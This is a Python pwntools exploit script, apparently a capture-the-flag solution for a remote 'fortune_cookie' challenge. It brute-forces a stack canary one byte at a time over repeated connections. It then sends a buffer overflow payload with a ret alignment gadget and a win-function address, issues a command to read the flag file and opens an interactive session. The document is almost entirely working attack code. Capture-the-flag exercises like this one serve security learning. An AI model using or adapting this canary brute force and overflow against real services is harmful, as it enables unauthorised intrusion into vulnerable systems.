#!/usr/bin/env python3
from pwn import *
import time

#HOST, PORT = '127.0.0.1', 4444
HOST, PORT = 'offsec.m0lecon.it', 13521
# canary of this instance 0x17e7d3d2f1a4b000
OFFSET_TO_CANARY = 72 #trovato con cyclic. il break andava messo in read_data. usato nc inviare l'input al server aperto con gdb
OFFSET_TO_RIP = 88
win_addr = 0x00401530
ret_addr = 0x000000000040101a

#elf = ELF('./fortune_cookie', checksec=False)

known = b"\x00"

for i in range(7):
    for bval in range(256):
        guess = known + bytes([bval])
        payload = b"A" * OFFSET_TO_CANARY + guess

        io = remote(HOST, PORT, level='error')
        io.recvuntil(b"wish\n")
        io.send(payload)
        try:
            data = io.recv(timeout=0.2)
        except EOFError:
            data = b""
        io.close()

        if b"OK" in data:
            known = guess
            log.success(f"byte {i+1}: {bval:02x}")
            break
canary = u64(known)
log.info(f"Canary: {canary:#x}")

io = remote(HOST, PORT)
io.recvuntil(b"wish\n")

payload = flat(
    b"A" * OFFSET_TO_CANARY,
    p64(canary),
    b"B" * (OFFSET_TO_RIP - OFFSET_TO_CANARY - 8),
    p64(ret_addr),    # ret gadget for alignment
    p64(win_addr),
)
io.send(payload)

# utile per mandare un comando invece di digitarlo a mano
sleep(0.5)
io.sendline(b'cat /home/user/flag')
io.interactive()